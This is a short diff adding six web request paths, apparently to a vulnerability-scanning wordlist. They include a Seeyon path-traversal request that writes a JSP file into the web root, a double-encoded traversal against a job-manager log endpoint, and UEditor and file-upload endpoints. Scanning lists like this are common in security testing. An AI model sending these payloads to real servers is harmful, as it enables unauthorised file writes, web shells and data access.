@@ -1,0 +1,6 @@
+/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
+/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
+/js/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
+/static/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
+/servlet/FileReceiveServlet
